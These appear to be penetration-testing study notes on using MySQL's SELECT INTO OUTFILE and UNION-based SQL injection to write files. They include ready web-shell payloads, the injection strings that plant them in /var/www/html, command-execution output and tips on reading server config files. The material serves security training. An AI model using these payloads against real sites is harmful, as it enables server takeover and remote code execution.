## Write Local Files
#### MySQL - Write Local File

```bash
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.

`secure_file_priv` may be set as follows:

- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

In the following example, we can see the `secure_file_priv` variable is empty, which means we can read and write data using `MySQL`:

#### MySQL - Secure File Privileges

  Attacking SQL Databases

```bash
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

# Writing Files via SQL Injection

Modern DBMSes restrict file writing due to its potential for exploitation—especially writing web shells to gain code execution. Still, in some setups, file writes are possible. This section explores how to perform such attacks.
#### Requirements for Writing Files

To write files to the backend server via SQLi on MySQL, the following conditions must be met:

1. The DB user must have the `FILE` privilege.   
2. The global variable `secure_file_priv` should allow writing.
3. The DB must have write access to the target directory.
#### Checking `secure_file_priv`

To verify if the DBMS allows writing files anywhere:

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -
```

- Empty value → read/write anywhere
- Specific path → only that directory is writable
- NULL → no read/write allowed
### SELECT INTO OUTFILE

To write file content directly from a SQL query:

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

To verify from the backend:

```bash
cat /tmp/test.txt
```

Output:

```
this is a test
```

This confirms that file creation was successful.
### Writing Files via SQL Injection

Goal: Write a file to `/var/www/html/proof.txt` using UNION-based injection.

```sql
cn' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

Verify it by visiting:

```
http://SERVER_IP:PORT/proof.txt
```
### Writing a PHP Web Shell

PHP shell payload:

```php
<?php system($_REQUEST[0]); ?>
```

SQLi payload:

```sql
cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -
```

After upload, access the shell:

```
http://SERVER_IP:PORT/shell.php?0=id
```

Example output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms remote code execution.

Note: File paths may vary; use `LOAD_FILE()` or read config files like `/etc/apache2/apache2.conf` to discover valid web roots if uncertain.
# Tags
> #Exploitation #Service-Exploitation #MySQL 